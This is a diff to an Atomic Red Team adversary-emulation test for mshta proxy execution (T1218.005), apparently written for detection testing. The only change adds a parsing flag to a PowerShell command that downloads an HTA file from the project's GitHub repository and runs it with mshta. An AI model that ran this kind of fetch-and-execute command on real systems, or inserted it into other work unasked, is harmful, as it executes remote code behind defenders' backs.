@@ -45,7 +45,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta
   executor:
     command: |
-      $var =Invoke-WebRequest "#{hta_url}"
+      $var =Invoke-WebRequest "#{hta_url}" -UseBasicParsing
       $var.content|out-file "#{temp_file}"
       mshta "#{temp_file}"
       start-sleep -s 15
